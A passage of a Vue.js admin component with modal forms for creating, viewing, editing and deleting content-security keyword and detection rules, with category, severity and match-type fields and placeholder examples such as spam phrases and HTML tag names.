            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingKeywordRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingKeywordRule ? 'Creating...' : 'Create Keyword Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Standard / Other Detection Rules Form -->
      <form v-else @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Rule Type -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Rule Type</label>
          <select 
            v-model="ruleForm.type"
            :disabled="!!editingRule"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          >
            <option value="keyword">Blacklisted Keyword / Phrase</option>
            <option value="domain">Malicious / Phishing Domain</option>
            <option value="html">Dangerous HTML Tag</option>
            <option value="attribute">Dangerous Event Attribute</option>
            <option value="redirect">Redirect Hijacking Rule</option>
          </select>
        </div>

        <!-- Pattern -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Pattern / Token String <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="ruleForm.pattern"
            type="text" 
            placeholder="e.g. casino-example.com, <script>, onclick, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category</label>
            <input 
              v-model="ruleForm.category"
              type="text" 
              placeholder="e.g. Phishing, Spam, XSS"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
            />
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity</label>
            <select 
              v-model="ruleForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20"
            >
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="ruleForm.description"
            rows="2"
            placeholder="Explain why this token is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are checked during catalog scans</p>
          </div>
          <input 
            v-model="ruleForm.enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs"
          >
            {{ editingRule ? 'Save Changes' : 'Create Rule' }}
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW KEYWORD RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="keywordModalState.isView.value"
      :title="isKeywordDetailsLoading ? 'Loading Keyword Rule...' : (selectedKeywordRule ? `Keyword Rule #${selectedKeywordRule.id}` : 'Keyword Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeKeywordViewModal"
    >
      <!-- Loading State -->
      <div v-if="isKeywordDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving keyword rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedKeywordRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested keyword rule from the security engine.</p>
        <button 
          type="button"
          @click="closeKeywordViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Blocked Pattern</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedKeywordRule.keyword }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedKeywordRule.severity))">
              {{ selectedKeywordRule.severity }}
            </span>
            <!-- Match Type Badge -->
            <span class="px-2.5 py-1 rounded-full bg-muted text-xs font-mono font-semibold text-foreground border border-border">
              {{ selectedKeywordRule.match_type }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedKeywordRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedKeywordRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedKeywordRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedKeywordRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedKeywordRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedKeywordRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedKeywordRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedKeywordRule.description?.trim()">{{ selectedKeywordRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedKeywordRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedKeywordRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedKeywordRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedKeywordRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeKeywordViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT KEYWORD RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="keywordModalState.isEdit.value"
      :title="isKeywordDetailsLoading ? 'Loading Keyword Rule...' : (editingKeywordRuleId ? `Edit Keyword Rule #${editingKeywordRuleId}` : 'Edit Keyword Rule')"
      subtitle="Update pattern heuristics and classification parameters for this keyword rule."
      max-width="max-w-lg"
      @close="closeKeywordEditModal"
    >
      <!-- Loading State -->
      <div v-if="isKeywordDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving keyword rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateKeywordRule" class="p-6 space-y-4">
        <!-- Keyword -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Keyword <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="keywordEditForm.keyword"
            type="text" 
            placeholder="e.g. free crypto giveaway, telegram @, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Match Type Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordEditForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Match Type <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordEditForm.match_type"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="WORD">Word</option>
              <option value="SUBSTRING">Substring</option>
            </select>
          </div>
        </div>

        <!-- Severity -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
          <select 
            v-model="keywordEditForm.severity"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
          >
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
            <option value="INFO">Info</option>
          </select>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="keywordEditForm.description"
            rows="2"
            placeholder="Explain why this keyword is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="keywordEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingKeywordEdit"
            @click="closeKeywordEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingKeywordEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingKeywordEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingKeywordEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE KEYWORD RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="keywordModalState.isDelete.value"
      title="Delete Keyword Rule"
      subtitle="Verify decommissioning of this content security keyword rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingKeywordRule"
      @close="closeKeywordDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this keyword rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Rule <span class="font-mono font-bold text-foreground">{{ deletingKeywordRule?.keyword || (selectedKeywordRule ? selectedKeywordRule.keyword : `ID #${keywordModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingKeywordRule"
            @click="closeKeywordDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingKeywordRule"
            @click="executeDeleteKeywordRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingKeywordRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingKeywordRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>
  </div>
</template>

<style scoped>
.custom-scrollbar::-webkit-scrollbar {
  height: 4px;
}
.custom-scrollbar::-webkit-scrollbar-track {
  background: transparent;
}
.custom-scrollbar::-webkit-scrollbar-thumb {
  background: rgba(148, 163, 184, 0.2);
  border-radius: 10px;
}
.custom-scrollbar:hover::-webkit-scrollbar-thumb {
  background: rgba(148, 163, 184, 0.4);
}
</style>
